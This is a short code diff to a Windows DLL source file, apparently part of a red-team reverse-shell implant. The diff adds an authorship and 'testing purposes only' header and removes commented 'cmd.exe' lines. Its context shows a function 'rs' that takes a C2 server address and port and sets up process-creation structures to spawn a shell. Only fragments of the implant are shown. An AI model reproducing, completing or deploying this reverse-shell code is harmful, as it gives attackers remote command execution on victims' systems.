@@ -1,4 +1,8 @@
-// dllmain.cpp : Define el punto de entrada de la aplicación DLL.
+//Author: Ocelot Offensive Security Team
+//Metbase Q Inc - All rights reserved
+//For testing purposes only. Use it on your own risk
+//Dec 2021
+
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #include "pch.h"
 #include <process.h>
@@ -40,8 +44,6 @@ void rs(char* C2Server, int C2Port) {
                 continue;
             }
             else {
-                //char Process[] = "cmd.exe";
-                //LPWSTR Process = "cmd.exe";
                 STARTUPINFO sinfo;
                 PROCESS_INFORMATION pinfo;
                 memset(&sinfo, 0, sizeof(sinfo));
